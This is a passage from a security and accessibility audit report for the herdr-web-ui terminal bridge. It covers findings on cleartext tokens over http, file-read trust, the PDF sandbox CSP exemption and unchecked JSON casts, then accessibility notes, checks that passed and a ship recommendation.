## S11 — Security — A configured token still traverses the LAN in cleartext on plain `http://`

**Location:** `server/access.ts` (accepts plain http by design), the cookie attributes at
`server/index.ts` (`HttpOnly`, `SameSite=Strict`, no `Secure`), and the phone-access story that
motivates binding a non-loopback host (S1).

**Issue.** Setting `HERDR_WEB_TOKEN` protects against a passive listener only if the user reaches
the server over `https://` or over Tailscale. On plain `http://` over Wi‑Fi — the shape the "access
from my phone" story invites — the token cookie and every keystroke are on the wire in the clear.
`Secure` is applied conditionally, not unconditionally omitted: `isSecureRequest()`
(`server/auth.ts:73`) sets the attribute on the session cookie at `:79` and the device cookie at
`:84` only when the request arrived over https. That is the correct choice — a `Secure` cookie
would simply not be sent over plain http — but it means the cleartext exposure is a property of
the transport the user chose, not of a missing flag.

**Impact.** Low, and partly already covered by S1's open-mode finding. Recorded separately because
it also applies to users who *did* configure a token and believe that protects them: on hotel or
conference Wi‑Fi a listener gets the token, not just a session.

**Recommended fix.** This is the same fix as S1's default-deny, plus a startup recommendation that
plain-http non-loopback binding print a sterner warning (it currently warns about open mode; it
does not warn that a token is not confidential in transit). `Secure` should be set when the request
arrived over https.

**Confidence:** Confirmed.

## S12 — Security — Deliberate trust model: any "drive" client can read any file the server's uid can read

**Location:** `server/file-view.ts` `resolveFilePath` / `fileResponse`, with the rationale
comment at the same site.

`/api/fs/file` resolves absolute paths, `~` and pane-relative paths and serves whatever
`statSync` permits, with a sandbox CSP and `nosniff` on the response. The comment states the
reasoning: a client that can type into a terminal can already `cat` the same file. This is
coherent for a single-user bridge, and `watch` devices are correctly excluded. Recorded for two
reasons: it is the multiplier that makes S1 severe (the open-LAN window is not "terminal
access", it is "file read as the user"), and any future multi-user use of this code would need
the boundary drawn here.

**Confidence:** Confirmed (design intent, documented in code).

## S13 — Security — Notes that are correct by design but worth keeping visible

- **`x-forwarded-proto: https` is trusted in `sameOrigin()`** (`server/machine-security.ts:24`)
  to support TLS-terminating proxies. A client that sets it can make the expected origin
  `https://<host>`; exploiting that still requires serving attacker content from the same host
  over HTTPS, so it is not an independent vector. `cameThroughProxy()` separately drives the
  forwarded-vs-direct decision in `decideAccess`.
- **Device cookies are long-lived** (1 year, `Max-Age` in `server/auth.ts`) with no rotation and
  no suspicious-session revocation; the only path is manual deletion in Settings → Devices.
  Tokens themselves are stored sha256-hashed, never plaintext — good.
- **The per-start bridge token** (`server/index.ts`, `randomBytes(32)`) lives in a 0600
  descriptor under `~/.config/herdr-web-ui/bridges`. Any local process that reads it gets full
  bridge access including `/ws` input. Acceptable under the local trust model; worth noting
  because it means the bridge is not an additional secret boundary against local malware.
- **`GET /api/push` lists every subscription** including endpoint hosts to any authenticated
  client. Logged push failures emit only `new URL(endpoint).host` and status — the careful
  choice, and the reason listing is the only residual disclosure.

**Confidence:** Confirmed.

## S14 — Security — Every typed JSON response is cast `as T` with no runtime check

**Location:** `src/lib/api.ts` (`getJson`/`getJsonTyped` — every typed fetch in the client goes
through it).

**Issue.** Typed responses are produced by casting the parsed JSON rather than validating it:
`return (await response.json()) as T`. The shared contract (`shared/protocol.ts`) is hand-written
on both sides, so the cast is an assertion of agreement, not a check.

**Impact.** Informational. Both sides of this contract are in this repo and change together, so a
mismatch is a bug in this codebase rather than untrusted input. It matters where the client is
upgraded against a server it does not match — an older server, or a remote PC running a different
herdr-web-ui — where a malformed response becomes a runtime `TypeError` deep in a component rather
than a clear contract error. It is also the shape that makes a malicious server response
indistinguishable from a bug, which S1's trust model does not rule out for a drive client that has
no reason to be trusted with UI integrity.

**Recommended fix.** Nothing cheap and nothing urgent; a schema validator on the wire types would
be the answer, and the generated types already exist for the herdr API proper. Recording it so the
assumption is visible: the client's type safety across the network is an assumption, not a check.

**Confidence:** Confirmed for the cast; the practical impact is Needs Verification.

## S15 — Security — PDF responses are exempt from the sandbox CSP the file viewer applies to
everything else

**Location:** `server/file-view.ts:102` (the CSP is set only when the response is not a PDF),
`src/components/FileViewer.tsx` (renders the PDF in a same-origin `<iframe>`).

**Issue.** Non-PDF file responses get a strict `sandbox; default-src 'none'` content-security
policy. PDFs are served without it so the browser's built-in viewer can render them, and the
viewer loads them in a same-origin iframe, which means the PDF document carries the app's origin
inside the iframe. The exemption is deliberate and documented in the code — the comment at
`server/file-view.ts:100-101` notes that the browser's own viewer refuses a sandboxed document and
that its scripts stay inside that viewer, never on this origin. The finding records that this
assumption is load-bearing: it holds for a conforming browser PDF viewer, and it is the one place
where the file viewer's sandbox policy does not apply, which is easy to assume it does.

**Impact.** Informational. A PDF is not executable in the browser's PDF viewer, and the realistic
threat is confined to a malicious *file* a drive client chose to open — the same trust S12 records.
The reason to record it: the exemption is the one place where the file viewer's sandbox policy does
not apply, and it is easy to assume it does.

**Recommended fix.** Serve PDFs from a throwaway origin or with a `Content-Disposition: inline`
plus a CSP that allows only the viewer's needs, or open them in a new tab with `noopener`. Low
priority; the current behaviour is acceptable if it is a deliberate, documented exemption.

**Confidence:** Confirmed for the exemption and the same-origin iframe.

## A-info — Accessibility — Patterns that look like findings and are deliberate

Recorded so they are not "fixed" by mistake:

- **`KeyBar` uses `tabIndex={-1}` and `role="group"`, not `toolbar`** (`src/components/KeyBar.tsx`).
  The bar is touch-only; a `toolbar` would promise arrow-key navigation it does not provide, so the
  component documents the choice inline. The earlier candidate finding that its Home/End keys lack
  a `label` prop was investigated and **rejected**: with no `label`, the `Key` falls back to its
  visible text, which reads correctly, unlike the illegible caps (`⇧Tab`, `PgUp PgDn`) that *do*
  carry labels. Every key in the bar has a legible accessible name.
- **`RowMenu`'s Tab asymmetry** — Tab *closes* the desktop popover and *is trapped* in the mobile
  sheet; both are documented in-component (see also A2's fix note).
- **The connection pill stays mounted while live** (`App.tsx` keeps the `role="status"` `.conn-live`
  element drawn by nothing) so scripts and AT can wait on it.
- **`--fs-2xs` pill text (11px, 10px in compact density)** — small, but it passes contrast and WCAG
  sets no minimum text size. Recorded because compact density pushes it below the comfortable zone.
- **`QrCode.tsx` is dark-on-white in both themes** — cameras read inverted codes unreliably, so the
  no-colour-literals rule does not apply. Correct exception, documented in-component.
- **`ChatView` uses `role="log"`** for the transcript — the right APG role, chosen deliberately over
  `status`/`alert`, which would swamp the user with every line.

# What the audit looked for and did not find

Stating the absence of problems is part of the report — these were checked and passed:

- **Client-side secret hygiene.** No auth token is ever stored in the browser: `localStorage`
  and `sessionStorage` hold only UI preferences (last view, composer height, slash-command
  usage, collapsed sidebar groups, terminal drafts, settings, palette recents, PC collapsed
  state). The token lives only in the `HttpOnly` cookie. `src/AGENTS.md` forbids persisting it
  and the code agrees.
- **No server logs emit secrets.** Every `console.*` was enumerated; the voice path explicitly
  scrubs the OpenAI key out of provider errors before returning or logging them
  (`server/voice.ts` `scrub`), and push logs only the endpoint host and status.
- **No open SSRF.** Machine proxying only reaches registered PCs over a loopback-forwarded SSH
  port, with `redirect: "error"` and a strict header allowlist that passes no cookies,
  `Authorization` (beyond the endpoint's own bearer) or forwarded headers.
- **Server-side enforcement of the `watch` role on the socket.** `input`, `keys`, `resize`,
  `secret`, `submit`, `take-over` and `role` are each re-checked against `client.data.mode` /
  `readOnly` in `server/index.ts`, and a `role` frame from a watch device is forced back to
  `observe` — the client's promise to observe is not trusted.
- **Terminal flow control is bounded end to end.** A 256 KiB pause threshold, resume at or
  below 64 KiB, a 4008 close on stall, 1 MiB hard budgets, and a client that never queues input
  while disconnected (it becomes a draft the user reviews) — the exact "never type into a dead
  socket" invariant a terminal bridge needs.
- **Concurrency correctness in the places it is hardest.** Prompt answers re-verify
  `prompt_id` after their `await` inside the pane's serialization turn; output credit cannot be
  double-released; `submit` is idempotent enough to survive a client that gave up; SSE-versus-poll
  supersession works through snapshot revisions; listener and timer cleanup is complete in every
  client component checked; server caches that *are* bounded are bounded properly
  (`codex.ts` LRU at 16/64/256, collector resync pruning, prompt pane-list pruning).
- **Accessibility foundations are genuinely strong** — the detail behind this is in
  `docs/reviews/2026-10-06-accessibility.md`, and the specifics worth keeping in the main report:
  contrast passes AA numerically across all four palettes in both themes (the lowest ratio is
  amber-light `--text-dim` on `--bg` at 5.29:1, light accent-on-accent-tint at 4.69:1, and the
  Catppuccin Latte block documents deliberate darkening — Mauve 17%, Red 18%, Blue 22%, Green 37%
  — to clear AA); reduced motion is enforced by `src/motion.test.ts`, which walks every CSS file
  and fails if an infinite animation lacks `steps()` or `var(--ease-pulse)`; focus visibility is
  global (`:focus-visible { outline: var(--ring) }` at `src/styles.css:478-480`); `ConfirmDialog`
  is a correct `alertdialog` and the reference implementation A2/A3 should be lifted from; the
  combobox/listbox pattern in `AgentPicker`, the composer's completion menus and the command
  palette is right, including `aria-activedescendant` and `onMouseDown` `preventDefault` to keep
  trigger focus; `AccessGate`'s form is exemplary (`autoComplete="one-time-code"`,
  `inputMode="numeric"`, `aria-invalid` wired to `aria-describedby`); status is conveyed by word
  and not colour alone (`StatusBadge`); `document.documentElement.lang` follows the language
  setting rather than staying at `index.html`'s hardcoded `en`. Beyond those: `NeedsInput.tsx` is
  the model for status-with-count (a visually-hidden `<p role="status">Panes waiting for input:
  {n}</p>` precedes the visible list, so screen readers get the number first); live-region
  placement is deliberate (`prompt-dock` is `aria-live="polite"` for the portaled `PromptCard`,
  which is `role="region" aria-label` with `aria-busy={pending}` and steps as `<ol>` with
  `aria-current="step"`; `PaneTerminal`'s banners are all `role="status"`); closed controls are
  genuinely removed from the accessibility tree (`VoiceRecordingPill` uses `aria-hidden={!open}`
  *and* conditional `tabIndex` on both buttons — both halves, which is the usual omission;
  `UsageMeters`' refresh button is `aria-busy` rather than `disabled`, with an in-comment reason:
  a disabled button drops focus, and Escape with it); and `Droplet`'s card button composes a
  descriptive label (`{title}, {detail}. {t("Open pane")}`) rather than relying on its visible
  text. This is better than typical at this complexity — which is why the findings above are
  framed as completing patterns the codebase already has, rather than as an overhaul.

## Items needing architectural change or deeper investigation

- **S1's pairing model** — restricting pairing initiation to an owner session requires deciding
  what an owner *is* when nothing is paired yet (loopback, or the first token holder). The
  default-deny part is trivial; this part needs a design decision, not a diff.
- **A1's `screenReaderMode`** — needs validation against the bundled patch's Gboard backspace
  guard and against IME composition, and a decision about how scrollback review is supposed to
  work when herdr owns it and xterm has `scrollback: 0`. Not a flag flip.
- **P1's transcript cache lifetimes** — per-pane release needs a hook in the pane-close path
  that does not currently exist, and windowing `piIndexes` means re-reading on demand, which
  the conversation readers do but `pi-tree` does not yet.
- **A4's tablist pattern** — either complete it with a `tabpanel` (which the one-pane-at-a-time
  layout makes awkward) or deliberately downgrade to a button group. A decision, then a small
  change.
- **CSP rollout** — `unsafe-inline` on styles is likely unavoidable initially; getting to a
  tight policy means auditing the inline-style usages (`Droplet.tsx` sets CSS custom properties
  inline, which is fine, but `AgentPicker.tsx:91`'s `maxHeight` is the kind of thing a strict
  policy blocks). Start with `Report-Only`.

## Release recommendation

**Ship with known risks.** Nothing in this report is a critical or unpatched remote-code
execution, and the security controls that exist are built carefully — timing-safe token
comparison, sha256-at-rest device tokens, `SameSite=Strict` HttpOnly cookies, a correct CSRF
chain, server-side enforcement of the `watch` role on every input path, quoting on every shell
and SSH interpolation, no secrets in logs, and no client-side token storage. The application is
also unusually well-tested for its size, and the accessibility foundations are better than
typical.

The two findings that keep this from "safe to ship" are both about *defaults a user can walk
into without intending to*:

- **S1** is a documented, warned-but-not-prevented configuration state in which a hotel or
  conference network gets full control of the user's terminals and files, and can mint a
  credential that lasts a year. It requires the user to bind a non-loopback host without a
  token — which the app's own phone-access story tempts users toward, and which the startup
  warning advises against rather than prevents.
- **A1** means the product's central surface is invisible to screen-reader users. It is not a
  regression and it is not a security issue, but it is a WCAG 2.2 AA blocker on the one surface
  the product exists to provide.

Recommendation: ship the current tree on its normal cadence, and take P0 (S1's default-deny
and A1's terminal labelling) as the first change after it — S1's one-line-ish gate in
`decideAccess` in particular is small enough not to warrant waiting for a release train. Note
that S1's *pairing-initiation* restriction and A1's `screenReaderMode` are the two items that
need design work rather than diffs; they should be tracked separately rather than blocking the
rest of P1.

## Resolution

What happened to each finding after this report, so a future reader does not have to re-derive it.
`fixed` means the code changed; unless the row says otherwise it was proved by the unit suites and
`bun run typecheck`, or by reading the code. `fixed (browser-verified)` means the change was also
driven in a real Chromium against the demo build — see "Not run here" for what that covered and what
it could not. `decide-only` means the finding was investigated and a change was chosen but not made.
`no change — deliberate` means the report's own argument is that the code is correct as written.
`recorded` means an observation was kept, as a code comment or a doc, rather than fixed.

Most of the remediation reached `main` through [#570](https://github.com/devswha/herdr-web-ui/pull/570);
A1's labelled region came later and separately, as
[#633](https://github.com/devswha/herdr-web-ui/pull/633). S1 and RL5 never landed — one declined as
a product decision, one removed before the merge. Every row below was re-read against this tree
on 2026-10-09; an earlier draft of this table described a branch that was reset, and four of its
claims did not survive that check (S1, S3, RL5, V8). If a row here ever disagrees with the code, the
code is right and the row is stale.
